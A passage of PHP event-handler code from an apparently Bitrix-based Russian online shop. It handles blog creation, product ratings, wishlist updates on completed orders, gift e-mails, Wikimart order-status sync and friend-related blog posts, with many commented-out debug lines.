                            "ENABLE_IMG_VERIF" => 'Y',
                            "ENABLE_COMMENTS" => 'Y',
                            "URL" => $name,
                            "ACTIVE" => "Y",
                            "ALLOW_HTML"=>"Y",
                            "DATE_CREATE" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "OWNER_ID" => $arFields["ID"],
                            "PERMS_POST" => array(
                                BLOG_USER_GROUP_ALL => BLOG_PERMS_READ,
                                BLOG_USER_GROUP_REG => BLOG_PERMS_READ
                            ),
                            "PERMS_COMMENT" => array(
                                BLOG_USER_GROUP_ALL => BLOG_PERMS_WRITE,
                                BLOG_USER_GROUP_REG => BLOG_PERMS_WRITE
                            ),
                        );

                        $newID = CBlog::Add($arFieldsBlog);
                        // if(!$newID){
                        // if ($ex = $APPLICATION->GetException())
                        // echo $ex->GetString();
                        // die();
                        // }
                        if(IntVal($newID)>0)
                        {

                            $arFieldsCat = array(
                                "BLOG_ID" => $newID,
                                "NAME" => "Друзья"
                            );

                            $newIDCat = CBlogUserGroup::Add($arFieldsCat);

                            if(intval($newIDCat)>0){
                                CBlog::SetBlogPerms($newID,Array($newIDCat => BLOG_PERMS_READ),BLOG_PERMS_POST);
                                CBlog::SetBlogPerms($newID,Array($newIDCat => BLOG_PERMS_WRITE),BLOG_PERMS_COMMENT);
                            }
                        }
                    }
                    endif;
            }
        }

        function OnBeforeIBlockElementAddHandler(&$arFields)
        {
            if($arFields["IBLOCK_ID"] == CATALOG_IBLOCK_ID && strlen($arFields["CODE"])<=0 && strlen($arFields["NAME"])>0)
            {
                $arFields["CODE"] = CUtil::translit(trim($arFields["NAME"]), "ru", array("max_len"=>100, "replace_space"=>"-", "change_case"=>"L"));
            } elseif($element["IBLOCK_ID"] == 15) {
                $arFields["ACTIVE_FROM"] = substr($arFields["ACTIVE_FROM"], 0, 10);
            }
        }

        function OnAfterIBlockElementAddHandler(&$arFields)
        {
            global $USER, $DB, $APPLICATION;
            //Из-за этого тормозит сайт при добавлении  в вам понравилось
            //if($arFields["IBLOCK_ID"]==WISHLIST_IBLOCK_ID)
            //            {
            //                if(CModule::IncludeModule("blog")){
            //                    $user = $USER->GetID();
            //                    $id = $arFields["ID"];
            //                    $type = WISHLIST_TYPE;
            //
            //
            //                    $arBlog = CBlog::GetByOwnerID($user);
            //
            //                    $arFilter = array();
            //                    $arFilter["ID"] = $id;
            //                    $arFilter["IBLOCK_ID"] = WISHLIST_IBLOCK_ID;
            //
            //
            //                    $dbWish = CIBlockElement::GetList(array(), $arFilter, false, $arNavParams, array("ID", "IBLOCK_ID", "PROPERTY_PRODUCT_ID"));
            //
            //
            //                    if($obEl = $dbWish->GetNext())
            //                    {
            //                        //print_R($obEl);
            //                        $prod_id = $obEl["PROPERTY_PRODUCT_ID_VALUE"];
            //                    }
            //                    // $SORT = Array("NAME" => "ASC", "ID" => "ASC");
            //
            //                    // $arFilter = Array(
            //                    // "BLOG_ID" => $arBlog["ID"]
            //                    // );
            //
            //                    // $dbUserGroup = CBlogUserGroup::GetList(
            //                    // $SORT,
            //                    // $arFilter
            //                    // );
            //
            //                    //$PERMS_P = Array("1" => BLOG_PERMS_READ, "2" => BLOG_PERMS_READ);
            //                    //$PERMS_C = Array("1" => BLOG_PERMS_WRITE, "2" => BLOG_PERMS_WRITE);
            //
            //                    // while ($arUserGroup = $dbUserGroup->Fetch())
            //                    // {
            //                    // $PERMS_P[$arUserGroup["ID"]] = BLOG_PERMS_READ;
            //                    // $PERMS_C[$arUserGroup["ID"]] = BLOG_PERMS_WRITE;
            //                    // }
            //
            //                    $typeClass = new IBlogType;
            //
            //                    $arFilter = array(
            //                        "IBLOCK_ID"=>WISHLIST_IBLOCK_ID,
            //                        "ACTIVE"=>"Y",
            //                    );
            //
            //                    $arFilter["PROPERTY_USER_ID"] = $user;
            //
            //                    $arFilter["!PROPERTY_STATUS"] = WISHLIST_PROPERTY_STATUS_ALREADY_HAVE_ENUM_ID;
            //
            //                    $dbWish = CIBlockElement::GetList(array(), $arFilter, false, $arNavParams, array("ID", "IBLOCK_ID", "PROPERTY_PRODUCT_ID", "PROPERTY_STATUS"));
            //                    $count = -1;
            //                    while($obEl = $dbWish->GetNext())
            //                    {
            //                        $count++;
            //                    }
            //
            //                    $arResult = array("ADD_ELEMENT_ID"=>$prod_id);
            //                    $arResult["COUNT"] = $count;
            //
            //                    $rsUser = CUser::GetByID($user);
            //                    if($arUser = $rsUser->Fetch()){
            //                        $arResult["GENDER"] = $arUser["PERSONAL_GENDER"];
            //                    }
            //
            //                    $arResult = serialize($arResult);
            //
            //                    $arFields = array(
            //                        "TITLE" => "Wish #".$arFields["ID"],
            //                        "DETAIL_TEXT" => $arResult,
            //                        "BLOG_ID" => $arBlog["ID"],
            //                        "AUTHOR_ID" => $user,
            //                        "DATE_CREATE" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
            //                        "DATE_PUBLISH" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
            //                        "PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH,
            //                        "ENABLE_TRACKBACK" => 'N',
            //                        "ENABLE_COMMENTS" => 'Y',
            //                        //"PERMS_P" => $PERMS_P,
            //                        //"PERMS_C" => $PERMS_C
            //                    );
            //
            //                    $newID = CBlogPost::Add($arFields);
            //
            //                    if(IntVal($newID)>0)
            //                    {
            //                        $typeClass->ISetType($newID,$type);
            //                    }
            //                    else
            //                    {
            //                        //if ($ex = $APPLICATION->GetException())
            //                        //echo $ex->GetString();
            //                    }
            //                }
            //            } elseif($arFields["IBLOCK_ID"] == 13) {
            //                updateSEOParams($arFields["ID"]);
            //            } elseif($arFields["IBLOCK_ID"] == 18) {
            //                if($arFields["ID"]>0) updateActionItemData($arFields["ID"]);
            //            }

            //обновляем свойство товара "доступен в каталоге"
            setProductAvailable($arFields["ID"]);
        }
        //PROP_del[12][101871]

        function OnAfterIBlockElementUpdateHandler(&$arFields)
        {
            //die(print_r($arFields));
            // if($element["IBLOCK_ID"]==CATALOG_IBLOCK_ID){
            // die(print_r($arFields));
            // }

            if(isset($GLOBALS["UPDATE_HACK"][$arFields["ID"]]))
            {
                CIBlockElement::SetPropertyValuesEx($arFields["ID"], $arFields["IBLOCK_ID"], $GLOBALS["UPDATE_HACK"][$arFields["ID"]]);
                unset($GLOBALS["UPDATE_HACK"][$arFields["ID"]]);
            }



            if($arFields["IBLOCK_ID"] == 13)
                updateSEOParams($arFields["ID"]);
            elseif($arFields["IBLOCK_ID"] == 18) {
                if($arFields["ID"]>0) updateActionItemData($arFields["ID"]);
            }

            if (!$GLOBALS["UPDATE_STOP"])
            {
                if ($arFields["IBLOCK_ID"] == CATALOG_IBLOCK_ID)
                {
                    // считаем рейтинг и кладем его в свойство для сортивки по рейтингу
                    unset($val);
                    foreach ($arFields["PROPERTY_VALUES"][CATALOG_VOTES_PROPERTY_ID] as $val)
                    {
                        $votes = $val["VALUE"];
                        break;
                    }
                    unset($val);
                    foreach ($arFields["PROPERTY_VALUES"][CATALOG_RATING_SUM_PROPERTY_ID] as $val)
                    {
                        $rating_sum = $val["VALUE"];
                        break;
                    }
                    $rating = RatingCalc($votes, $rating_sum);

                    if ($rating > 0)
                    {
                        $GLOBALS["UPDATE_STOP"] = true;
                        $res = CIBlockElement::SetPropertyValuesEx($arFields["ID"], false, array("RATING" => $rating));
                        $GLOBALS["UPDATE_STOP"] = false;
                    }
                }
            }

            if(isset($GLOBALS["UPDATE_HACK_AFTER"][$arFields["ID"]]))
            {
                foreach($GLOBALS["UPDATE_HACK_AFTER"][$arFields["ID"]] as $strCode => $strVal)
                    CIBlockElement::SetPropertyValues($arFields["ID"], $arFields["IBLOCK_ID"], $strVal, $strCode);

                unset($GLOBALS["UPDATE_HACK_AFTER"][$arFields["ID"]]);
            }


            //обновляем значение свойства "доступность в каталоге"
            setProductAvailable($arFields["ID"]);

        }

        /*function OnSaleComponentOrderCompleteHandler($p,$arFields){
        $PR_ID = intval($_SESSION["PR_ID"]);
        if($PR_ID>0){
        $arPr = CSaleOrderUserProps::GetByID($PR_ID);
        //$arPr["USER_ID"]
        }
        die(print_r($arFields));
        }*/

        function OnSaleStatusOrderHandler($ID, $val)
        {
            /////////////////////////////////////////////////////
            // переводим товары в вишлисте в статус "уже есть" //
            // при выполнении заказа (статус F)                 //
            /////////////////////////////////////////////////////
            if($val == "F") {
                CModule::IncludeModule('iblock');
                CModule::IncludeModule('sale');
                $arOrderProps = array();
                if($arOrder = CSaleOrder::GetByID($ID)) {
                    // получаем товары в заказе
                    $arBasketItems = array();

                    $dbBasketItems = CSaleBasket::GetList(array(), array(
                        "ORDER_ID" => $ID
                        ), false, false, array("ID", 'NAME', "PRODUCT_ID"));
                    while($arItems = $dbBasketItems->Fetch()) {
                        $arBasketItems[] = $arItems["NAME"];
                        $arProductsIDs[] = $arItems["PRODUCT_ID"];

                    }

                    $comments = $arOrder["COMMENTS"];
                    if(preg_match("/PRESENT_USER_ID=/", $comments)) {
                        $user = explode("PRESENT_USER_ID=", $comments);
                        $user = $user[1];
                    }

                    $order_user = $arOrder["USER_ID"];

                    $user = intval($user);

                    $db_vals = CSaleOrderPropsValue::GetList(array("SORT" => "ASC"), array(
                        "ORDER_ID" => $ID,
                        "CODE" => "EMAIL"
                    ));

                    if($arVals = $db_vals->Fetch()) {
                        $email_to = $arVals["VALUE"];
                    }

                    $order_user_mail = "";

                    $rsUser = CUser::GetByID($order_user);
                    if($arUser = $rsUser->Fetch()) {
                        $order_user_mail = $arUser["EMAIL"];
                        $order_user_name = "";
                        if(!empty($arUser["NAME"])) $order_user_name = $arUser["NAME"];

                        if(!empty($arUser["LAST_NAME"])) if(empty($order_user_name)) $order_user_name = $arUser["LAST_NAME"];
                            else
                                $order_user_name .= " ".$arUser["LAST_NAME"];

                        if(empty($order_user_name)) $order_user_name = $arUser["EMAIL"];

                        if(empty($email_to) && $user == 0) $email_to = $arUser["EMAIL"];
                    }

                    $user_comments = $arOrder["USER_DESCRIPTION"];
                    if(0 === strpos($user_comments, 'certificate_for_')) {
                        $touserid = intval(str_replace('certificate_for_', '', $user_comments));
                    }

                    // находим по цветоразмеру товар
                    $dbEl = CIBlockElement::GetList(Array(), Array(
                        "IBLOCK_ID" => OFFERS_IBLOCK_ID,
                        "ACTIVE" => "Y",
                        "ID" => $arProductsIDs
                        ), false, false, array(
                            "ID",
                            "IBLOCK_ID",
                            "PROPERTY_CML2_LINK"
                    ));
                    while($obEl = $dbEl->GetNext()) $arCatalogProductsIDs[] = $obEl["PROPERTY_CML2_LINK_VALUE"];

                    if($order_user > 0) {
                        // вносим пользователя в группу 12 [Совершена миниум одна покупка]
                        $arGroups = CUser::GetUserGroup($order_user);
                        if(!in_array(12, $arGroups))
                            CUser::SetUserGroup($order_user, array_merge(CUser::GetUserGroup($order_user), array(12)));


                        // выбираем в вишлисте нужные элементы и выставляем в них статус "уже есть"
                        $dbEl = CIBlockElement::GetList(Array(), Array(
                            "IBLOCK_ID" => WISHLIST_IBLOCK_ID,
                            "ACTIVE" => "Y",
                            "PROPERTY_PRODUCT_ID" => $arCatalogProductsIDs,
                            "PROPERTY_USER_ID" => $order_user
                            ), false, false, array(
                                "ID",
                                "IBLOCK_ID",
                                "NAME"
                        ));
                        $countN = 0;
                        while($obEl = $dbEl->GetNext()) {
                            $countN++;
                            CIBlockElement::SetPropertyValuesEx($obEl["ID"], false, array("STATUS" => WISHLIST_PROPERTY_STATUS_ALREADY_HAVE_ENUM_ID));
                        }
                        if($countN == 0) {
                            $el = new CIBlockElement;
                            $arLoadProductArray = Array(
                                "IBLOCK_ID" => WISHLIST_IBLOCK_ID,
                                "IBLOCK_SECTION_ID" => false,
                                "ACTIVE" => "Y",
                                "NAME" => "WISH_".$order_user,
                                "PROPERTY_VALUES" => array(
                                    "USER_ID" => $order_user,
                                    "PRODUCT_ID" => $arCatalogProductsIDs,
                                    "STATUS" => WISHLIST_PROPERTY_STATUS_ALREADY_HAVE_ENUM_ID,
                                )
                            );
                            if($PRODUCT_ID = $el->Add($arLoadProductArray)) {

                            }
                        }
                    }

                    if($user > 0) {
                        //CModule::IncludeModule('iblock');

                        //print_R($arOrder["USER_ID"]);
                        //die(print_R($arCatalogProductsIDs));

                        $user_name = "";
                        $rsUser = CUser::GetByID($user);
                        if($arUser = $rsUser->Fetch()) {
                            if(!empty($arUser["NAME"])) $user_name = $arUser["NAME"];

                            if(!empty($arUser["LAST_NAME"])) if(empty($user_name)) $user_name = $arUser["LAST_NAME"];
                                else
                                    $user_name .= " ".$arUser["LAST_NAME"];

                            if(empty($user_name)) $user_name = $arUser["EMAIL"];
                            if(empty($email_to)) $email_to = $arUser["EMAIL"];
                        }
                        $arEventFields = array(
                            "USER_MAIL" => $order_user_mail,
                            "NAME" => $order_user_name,
                            "ORDER_ID" => $ID,
                            "USER_PRESENT" => $user_name
                        );
                        $arEventFields2 = array(
                            "USER_MAIL" => $email_to,
                            "NAME" => $user_name,
                            "ORDER_ID" => $ID,
                            "USER_PRESENT" => $order_user_name
                        );
                        //echo SITE_ID;
                        //die();
                        //print_R($arEventFields);
                        //die(print_R($arEventFields2));
                        CEvent::Send("SEND_ORDER_DO_TO_PERSON", MY_SITE_ID, $arEventFields, "N", 72);
                        CEvent::Send("SEND_ORDER_DO_PERSON", MY_SITE_ID, $arEventFields2, "N", 71);

                    }
                    elseif($touserid > 0) {
                        $fromuserid = intval($arOrder['USER_ID']);
                        $rsToUser = CUser::GetByID($touserid);
                        $arToUser = $rsToUser->Fetch();
                        $rsFromUser = CUser::GetByID($fromuserid);
                        $arFromUser = $rsFromUser->Fetch();
                        if($arToUser && $arFromUser) {

                            $fulogin = $arFromUser['LOGIN'];
                            $funame = trim($arFromUser['NAME']);
                            $funame .= trim((strlen($funame) > 0?' ':'').trim($arFromUser['SECOND_NAME']));
                            $funame .= trim((strlen($funame) > 0?' ':'').trim($arFromUser['LAST_NAME']));
                            $fuemail = $arFromUser['EMAIL'];

                            $tulogin = $arToUser['LOGIN'];
                            $tuname = trim($arToUser['NAME']);
                            $tuname .= trim((strlen($funame) > 0?' ':'').trim($arToUser['SECOND_NAME']));
                            $tuname .= trim((strlen($funame) > 0?' ':'').trim($arToUser['LAST_NAME']));
                            $tuemail = $arToUser['EMAIL'];

                            global $DB;
                            $di = $arOrder['DATE_INSERT'];
                            $orderdate = $DB->FormatDate($arOrder['DATE_INSERT'], "YYYY-MM-DD HH:MI:SS", "DD.MM.YYYY");

                            $biname = implode(', ', $arBasketItems);

                            $arEventFields3 = array(
                                "FROM_USER_LOGIN" => $fulogin,
                                "FROM_USER_NAME" => $funame,
                                "FROM_USER_EMAIL" => $fuemail,
                                "TO_USER_LOGIN" => $tulogin,
                                "TO_USER_NAME" => $tuname,
                                "TO_USER_EMAIL" => $tuemail,
                                "ORDER_ID" => $ID,
                                "ORDER_DATE_INSERT" => $orderdate,
                                'BASKET_ITEM' => $biname,
                            );
                            CEvent::Send("SEND_ORDER_PRESENT_CERTIFICATE", MY_SITE_ID, $arEventFields3);
                        }

                    }
                    else {
                        // $arEventFields = array(
                        // "USER_MAIL"=>$email_to,
                        // "NAME"=>$order_user_name,
                        // "ORDER_ID"=>$ID,
                        // );
                        // CEvent::Send("SEND_ORDER_DO", SITE_ID, $arEventFields);
                    }

                    // увеличиваем рейтинг продаж у купленых товаров
                    //if(CModule::IncludeModule("iblock")){
                    $dbEl = CIBlockElement::GetList(Array(), Array(
                        "IBLOCK_ID" => CATALOG_IBLOCK_ID,
                        "ID" => $arCatalogProductsIDs
                        ), false, false, array(
                            "ID",
                            "IBLOCK_ID",
                            "NAME",
                            "PROPERTY_SALES_RATING"
                    ));
                    while($obEl = $dbEl->GetNext()) {
                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/sales_rating.txt', var_export(array($obEl), true));
                        $new_rating = $obEl["PROPERTY_SALES_RATING_VALUE"] + 1;
                        CIBlockElement::SetPropertyValuesEx($obEl["ID"], false, array("SALES_RATING" => $new_rating));
                    }
                    //}
                }

            }

            // wikmart
            //если ставится один из статусов - "в работе", "подтвержден клиентом", "ожидает поставку товара" - на wikimart необходимо отдать статус "принят".
            if($ID > 0 && in_array($val, array("O", "A", "P"))) {
                $rsWikiOrderID = CSaleOrderPropsValue::GetList(array(), array("ORDER_ID" => $ID, "ORDER_PROPS_ID" => 25));
                if($arWikiOrderID = $rsWikiOrderID->Fetch()) {

                    $intWikiOrderID = $arWikiOrderID["VALUE"];

                    if($intWikiOrderID > 0) {
                        require_once($_SERVER["DOCUMENT_ROOT"].'/bitrix/modules/itees.wikimart/include.php');

                        $appId = COption::GetOptionString('itees.wikimart', 'general_api_id', '');
                        $appSecret = COption::GetOptionString('itees.wikimart', 'general_api_secret', '');

                        $cWikiClient = new Wikimart\MerchantAPIClient\Client('http://merchant.wikimart.ru', $appId, $appSecret);

                        $obResult = $cWikiClient->methodGetOrder(intval($intWikiOrderID));
                        $arWikiOrderData = $obResult->GetData();

                        if($arWikiOrderData->status != "confirmed") {
                            $obResult = $cWikiClient->methodSetOrderStatus(intval($intWikiOrderID), "confirmed", null, iconv("windows-1251", "utf-8", 'Магазин принял заказ'));

                            if($obResult->getHttpCode() != 200) {
                                global $APPLICATION;
                                $APPLICATION->ThrowException($obResult->getError());
                            }

                            //                        else {
                            //                            $arBitrixOrder = CSaleOrder::GetByID($ID);
                            //
                            //                            if($arBitrixOrder["USER_ID"] == 10366) {
                            //
                            //                                $obResult = $cWikiClient->methodGetOrder(intval($intWikiOrderID));
                            //                                $obOrder = $obResult -> GetData();
                            //
                            //                                if(is_object($obOrder->buyer))
                            //                                {
                            //                                    $client = $name = utf2win($obOrder->buyer->name);
                            //                                    $login = substr(Cutil::translit($name, "ru", Array("replace_space" => "_", "replace_other" => "_")), 0, 16);
                            //                                    $arFilter = Array("LOGIN" => $login, "UF_WIKIMART" => true);
                            //                                    $rsUser = CUser::GetList(($by = "ID"), ($order="ASC"), $arFilter);
                            //                                    if($arUser = $rsUser->Fetch())
                            //                                    {
                            //                                        $user_id = $arUser['ID'];
                            //                                    } else {
                            //                                        $login = IteesWikiMart::GetFreeLogin($login);
                            //                                        $email = $obOrder->buyer->email;
                            //                                        $company = $obOrder->buyer->company;
                            //                                        $phone = implode(', ', $obOrder->buyer->phones);
                            //                                        if(empty($email))
                            //                                            $email = 'n@none.none';
                            //                                        $email = IteesWikiMart::GetFreeEmail($email);
                            //                                        $password = randString(10);
                            //
                            //                                        $obuser = new CUser;
                            //                                        $arFields = Array(
                            //                                            "NAME" => utf2win($name),
                            //                                            "LAST_NAME" => "",
                            //                                            "EMAIL" => $email,
                            //                                            "LOGIN" => utf2win($login),
                            //                                            "LID" => $site_id,
                            //                                            "ACTIVE" => "Y",
                            //                                            "PASSWORD" => $password,
                            //                                            "CONFIRM_PASSWORD" => $password,
                            //                                            "PERSONAL_MOBILE" => $phone,
                            //                                            "WORK_COMPANY" => utf2win($company),
                            //                                            "UF_WIKIMART"    => true
                            //                                        );
                            //
                            //                                        $arGroups = explode(',', COption::GetOptionString('itees.wikimart', 'general_user_group', '0'));
                            //                                        if(count($arGroups) > 0)
                            //                                            $arFields["GROUP_ID"] = $arGroups;
                            //
                            //                                        $user_id = $obuser->Add($arFields);
                            //                                    }
                            //
                            //                                    if($user_id > 0) {
                            //                                        CSaleOrder::Update($ID, array("USER_ID" => $user_id));
                            //                                    }
                            //                                }
                            //                            }
                            //                        }
                        }
                    }
                }
            }
        }

        function OnBeforeOrderUpdateHandler($ID, &$arFields)
        {
            //echo "<pre>"; var_dump($arFields); echo "</pre>";
            //echo "<pre>"; var_dump($_REQUEST); echo "</pre>";

        }

        function OnBeforeUserRegisterHandler(&$arFields){

            // if(!isset($_REQUEST["NEW_PASSWORD"]) || empty($_REQUEST["NEW_PASSWORD"])){
            // global $APPLICATION;
            // $APPLICATION->ThrowException("Введенный пароль не корректен");
            // return false;
            // }

            // if(!isset($_REQUEST["NEW_PASSWORD_CONFIRM"]) || empty($_REQUEST["NEW_PASSWORD_CONFIRM"])){
            // global $APPLICATION;
            // $APPLICATION->ThrowException("Введенное подтверждение пароля не корректен");
            // return false;
            // }

            // if(isset($_REQUEST["NEW_PASSWORD"]) && isset($_REQUEST["NEW_PASSWORD_CONFIRM"]) && $_REQUEST["NEW_PASSWORD"]==$_REQUEST["NEW_PASSWORD_CONFIRM"] && isset($_REQUEST["NEW_GENERATE"]) && $_REQUEST["NEW_GENERATE"]=="N"){
            // if($_REQUEST["NEW_PASSWORD"]!=$arFields["PASSWORD"]){
            // $arFields["PASSWORD"] = $_REQUEST["NEW_PASSWORD"];
            // $arFields["CONFIRM_PASSWORD"] = $_REQUEST["NEW_PASSWORD"];
            // }
            // }
            // else{
            // global $APPLICATION;
            // $APPLICATION->ThrowException("Введенное пароль и пароль подтверждения не совпадают.");
            // return false;
            // }


            //print_R($_REQUEST);
            //die(print_R($arFields));
            if (!preg_match("/^[0-9а-яА-Яa-zA-Z\-_]+?@[0-9а-яА-Яa-zA-Z\-_]+?\.[0-9а-яА-Яa-zA-Z\-_]{2,}$/u", $arFields["LOGIN"])===false)
            {
                global $APPLICATION;
                $APPLICATION->ThrowException("Введенная электронный почта не корректна");
                return false;
            }
        }

        function OnPostAddHandler($id, &$arFields){

            global $USER;
            $typeClass = new IBlogType;
            if(!$type = $typeClass->IGetType($id)){
                $typeClass->ISetType($id,BLOG_TYPE);
            }

        }

        function OnSocNetUserRelationsUpdateHandler($id,&$arFields){
            global $USER, $DB, $APPLICATION;
            $typeClass = new IBlogType;
            if(CModule::IncludeModule("blog")){
                $ar_res = CSocNetUserRelations::GetByID($id);

                if($ar_res["RELATION"]=="F"){

                    //первый пользователь
                    $arBlog = CBlog::GetByOwnerID($ar_res["FIRST_USER_ID"]);
                    if(is_array($arBlog))
                        $first = $arBlog["ID"];

                    if(intval($first)>0){
                        $arResult = array();
                        $arResult["FRIEND"] = $ar_res["SECOND_USER_ID"];
                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddFirstResult0.htm', '<pre>'.var_export(array("result"=>$arResult), true).'</pre>');
                        $arResult = serialize($arResult);

                        $arFields = array(
                            "TITLE" => "Friends #".$id,
                            "DETAIL_TEXT" => $arResult,
                            "BLOG_ID" => $first,
                            "AUTHOR_ID" => $ar_res["FIRST_USER_ID"],
                            "DATE_CREATE" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "DATE_PUBLISH" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH,
                            "ENABLE_TRACKBACK" => 'N',
                            "ENABLE_COMMENTS" => 'Y',
                            //"PERMS_P" => $PERMS_P,
                            //"PERMS_C" => $PERMS_C
                        );

                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddFirst.htm', '<pre>'.var_export(array("result"=>$arFields), true).'</pre>');
                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddFirstResult.htm', '<pre>'.var_export(array("result"=>$arResult), true).'</pre>');

                        $newID = CBlogPost::Add($arFields);
                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddFirstNewsID.htm', '<pre>'.var_export(array("result"=>$newID), true).'</pre>');

                        if(IntVal($newID)>0)
                        {
                            $type = FRIEND_TYPE;
                            $typeClass->ISetType($newID,$type);
                        }
                        else
                        {
                            //if ($ex = $APPLICATION->GetException())
                            //echo $ex->GetString();

                        }
                    }
                    //второй пользователь
                    $arBlog = CBlog::GetByOwnerID($ar_res["SECOND_USER_ID"]);

                    if(is_array($arBlog))
                        $first = $arBlog["ID"];

                    if(intval($first)>0){
                        $arResult = array();
                        $arResult["FRIEND"] = $ar_res["FIRST_USER_ID"];
                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddSecondResult0.htm', '<pre>'.var_export(array("result"=>$arResult), true).'</pre>');
                        $arResult = serialize($arResult);

                        $arFields = array(
                            "TITLE" => "Friends #".$id,
                            "DETAIL_TEXT" => $arResult,
                            "BLOG_ID" => $first,
                            "AUTHOR_ID" => $ar_res["SECOND_USER_ID"],
                            "DATE_CREATE" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "DATE_PUBLISH" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH,
                            "ENABLE_TRACKBACK" => 'N',
                            "ENABLE_COMMENTS" => 'Y',
                            //"PERMS_P" => $PERMS_P,
                            //"PERMS_C" => $PERMS_C
                        );


                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddSecond.htm', '<pre>'.var_export(array("result"=>$arFields), true).'</pre>');
                        //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printAddSecondResult.htm', '<pre>'.var_export(array("result"=>$arResult), true).'</pre>');

                        $newID = CBlogPost::Add($arFields);

                        if(IntVal($newID)>0)
                        {
                            $type = FRIEND_TYPE;
                            $rez = $typeClass->ISetType($newID,$type);

                        }
                        else
                        {
                            //if ($ex = $APPLICATION->GetException())
                            //echo $ex->GetString();
                        }
                    }


                    //подписываем на блоги
                    $arBlog = CBlog::GetByOwnerID($ar_res["FIRST_USER_ID"]);
                    if(is_array($arBlog)){
                        $user = $ar_res["SECOND_USER_ID"];

                        if(intval($user)>0){
                            $SORT = Array("DATE_CREATE" => "DESC", "NAME" => "ASC");
                            $arFilter = Array(
                                "ACTIVE" => "Y",
                                "GROUP_SITE_ID" => SITE_ID,
                                "OWNER_ID" => $user
                            );
                            $arSelectedFields = array("ID", "NAME", "OWNER_ID");

                            $dbBlogs = CBlog::GetList(
                                $SORT,
                                $arFilter,
                                false,
                                false,
                                $arSelectedFields
                            );

                            if ($arBlogMy = $dbBlogs->Fetch())
                            {

                                $arFriendUsers = array();
                                $dbUsers = CBlogUser::GetList(
                                    array(),
                                    array(
                                        "GROUP_BLOG_ID" => $arBlogMy["ID"],
                                    ),
                                    array("ID", "USER_ID")
                                );
                                while($arUsers = $dbUsers->Fetch())
                                    $arFriendUsers[] = $arUsers["USER_ID"];
                                //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printB111.htm', '<pre>'.var_export(array("result"=>$arFriendUsers), true).'</pre>');
                                if(!is_array($arFriendUsers)) $arFriendUsers = array();
                                if(!in_array($arBlog["OWNER_ID"],$arFriendUsers)){
                                    $arOrder = Array(
                                        "NAME" => "ASC",
                                        "ID" => "ASC"
                                    );
                                    $arFilter = Array(
                                        "SITE_ID"=>SITE_ID,
                                        "BLOG_ID"=>$arBlogMy["ID"]
                                    );
                                    $arSelectedFields = Array("ID", "SITE_ID", "NAME");

                                    $dbGroup = CBlogUserGroup::GetList($arOrder, $arFilter, false, false, $arSelectedFields);
                                    $group = array();
                                    while ($arGroup = $dbGroup->Fetch())
                                    {
                                        $group[] = $arGroup["ID"];
                                    }
                                    //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printB1111.htm', '<pre>'.var_export(array("result"=>$arGroup), true).'</pre>');
                                    if(count($group)==0){
                                        $arFields = array(
                                            "NAME" => 'Друзья',
                                            "BLOG_ID" => $arBlogMy["ID"]
                                        );
                                        $group[] = CBlogUserGroup::Add($arFields);
                                    }


                                    //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printB11111.htm', '<pre>'.var_export(array("result"=>$group), true).'</pre>');
                                    if($arBlog["OWNER_ID"]!=$user){
                                        if(!CBlogUser::AddToUserGroup($arBlog["OWNER_ID"], $arBlogMy["ID"], $group, "Y", BLOG_BY_USER_ID , BLOG_ADD))
                                        {
                                            //echo "false";
                                            //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printB111111.htm', '<pre>sadasdasd</pre>');
                                            //return;
                                        }
                                        //echo "add";
                                        //return;
                                    }
                                }
                            }
                        }
                    }

                    //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printBLOGTOADD.htm', '<pre>asdasdasddddddddd</pre>');
                    //подписываем на блоги
                    $arBlog = CBlog::GetByOwnerID($ar_res["SECOND_USER_ID"]);
                    //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printBLOGTOADD.htm', '<pre>'.var_export(array("result"=>$arBlog), true).'</pre>');
                    if(is_array($arBlog)){
                        $user = $ar_res["FIRST_USER_ID"];

                        if(intval($user)>0){
                            $SORT = Array("DATE_CREATE" => "DESC", "NAME" => "ASC");
                            $arFilter = Array(
                                "ACTIVE" => "Y",
                                "GROUP_SITE_ID" => SITE_ID,
                                "OWNER_ID" => $user
                            );
                            $arSelectedFields = array("ID", "NAME", "OWNER_ID");

                            $dbBlogs = CBlog::GetList(
                                $SORT,
                                $arFilter,
                                false,
                                false,
                                $arSelectedFields
                            );

                            if ($arBlogMy = $dbBlogs->Fetch())
                            {
                                //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printBLOGTO2ADD.htm', '<pre>'.var_export(array("result"=>$arBlogMy), true).'</pre>');
                                $arFriendUsers = array();
                                $dbUsers = CBlogUser::GetList(
                                    array(),
                                    array(
                                        "GROUP_BLOG_ID" => $arBlogMy["ID"],
                                    ),
                                    array("ID", "USER_ID")
                                );
                                while($arUsers = $dbUsers->Fetch())
                                    $arFriendUsers[] = $arUsers["USER_ID"];

                                if(!is_array($arFriendUsers)) $arFriendUsers = array();
                                if(!in_array($arBlog["OWNER_ID"],$arFriendUsers)){
                                    $arOrder = Array(
                                        "NAME" => "ASC",
                                        "ID" => "ASC"
                                    );
                                    $arFilter = Array(
                                        "SITE_ID"=>SITE_ID,
                                        "BLOG_ID"=>$arBlogMy["ID"]
                                    );
